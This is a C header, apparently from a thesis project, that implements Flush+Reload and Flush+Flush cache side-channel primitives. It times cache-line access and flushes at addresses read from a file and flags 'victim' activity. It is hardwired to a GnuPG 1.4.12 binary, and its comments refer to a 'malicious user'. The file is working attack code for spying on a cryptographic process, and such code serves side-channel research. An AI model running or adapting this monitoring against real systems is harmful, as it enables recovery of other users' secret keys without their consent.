#ifndef CACHETECHNIQUES_H_
#define CACHETECHNIQUES_H_

#define _GNU_SOURCE
#include <limits.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <limits.h>
#include <fcntl.h> //open
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close
#include <sched.h>
#include <pthread.h>

#include "assemblyinstructions.h"

#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"
#define EXE_ADDRS_FILENAME "/home/root/thesis-code/exe_addresses.txt"

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)

unsigned int reload(void* addr) {
	return time_movl(addr);
}

unsigned long long getcurrenttsc() {
	return rdtscp();
}

void accessway(void * addr) {
	movl(addr);
}

unsigned int timeaccessway(void *addr) {
	return time_movl(addr);
}

void flush(void* addr) {
	clflush(addr);
}

unsigned int timeflush(void *addr) {
	return time_clflush(addr);
}

unsigned int reloadandflush(void* addr) {
	return time_movl_clflush(addr);
}

unsigned int flushandflush(void* addr) {
	return time_clflush_clflush(addr);
}

// Set the core in which the process goes to
int setcoreaffinity(int core_id) {
	int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
	if (core_id < 0 || core_id >= num_cores)
		handle_error("Wrong core id");
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(core_id, &cpuset);
	return sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

// Suspend the process execution
void delayloop(size_t cycles) {
	unsigned long long start = rdtscp();
	while ((rdtscp() - start) < cycles)
		;
}

// Obtain exe addrs from a file
long int getaddrstomonitor(const char* exeaddrsfilename, long int* out_addrs) {
	FILE* ptr_addrs = fopen(exeaddrsfilename, "r");
	if (ptr_addrs == NULL)
		handle_error("fopen_exeaddrsfilename");
	unsigned int linesize = 0, linelength = 0;
	char* line = malloc(256 * sizeof(char*));
	char* pEnd;
	long int nr_addrs = 0;
	int i;

	if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
		handle_error("getline_nr_addrs <= 0");
	line[linelength - 1] = '\0';
	nr_addrs = strtol(line, &pEnd, 10);
	if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
		handle_error("strtol_nr_addrs != \\r or \\n or \\0");

	long int addraux;

	for (i = 0; i < nr_addrs; ++i) {
		if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
			handle_error("getline_addrs <= 0");
		addraux = strtol(line, &pEnd, 0);
		if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
			handle_error("strtol_addrs != \\r or \\n or \\0");
		out_addrs[i] = addraux;
	}
	free(line);
	fclose(ptr_addrs);
	return nr_addrs;
}

// Obtain a flag to verify if the victim has made some activity
int isvictimactive(unsigned int *analysis, int nr_addrs, int threshold) {
	int i;
	for (i = 0; i < nr_addrs; ++i) {
		if (analysis[i] < threshold)
			return 1;
	}
	return 0;
}

// Verify if the malicious user has missed some info
int missedvictimactivity(unsigned long long startcycles) {
	if (getcurrenttsc() > startcycles)
		return 1;
	while (getcurrenttsc() < startcycles)
		;
	return 0;
}

// Put 0s on the analysis when victim activity was missed
void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
		long int *exe_addrs, int nr_addrs) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		out_analysis[addrs_index] = 0;
	}
}

// Analyse addrs using Flush+Reload technique
void fr_analysealladdrs(int flag_output_raw_data, unsigned int *out_analysis,
		unsigned long ptr_offset, long int *exe_addrs, int nr_addrs,
		int threshold) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		char * aux = (char*) exe_addrs[addrs_index];
		char * ptr_to_monitor = aux + ptr_offset;
		unsigned int auxtsc = reloadandflush(ptr_to_monitor);
		if (flag_output_raw_data)
			out_analysis[addrs_index] = auxtsc < UINT_MAX ? auxtsc : UINT_MAX;
		else
			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
	}
}

// Analyse addrs using Flush+Flush technique
void ff_analysealladdrs(int flag_output_raw_data, unsigned int *out_analysis,
		unsigned long ptr_offset, long int *exe_addrs, int nr_addrs,
		int threshold) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		char * aux = (char*) exe_addrs[addrs_index];
		char * ptr_to_monitor = aux + ptr_offset;
		unsigned int auxtsc = flushandflush(ptr_to_monitor);
		if (flag_output_raw_data)
			out_analysis[addrs_index] = auxtsc < UINT_MAX ? auxtsc : UINT_MAX;
		else
			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
	}
}

#endif /* CACHETECHNIQUES_H_ */
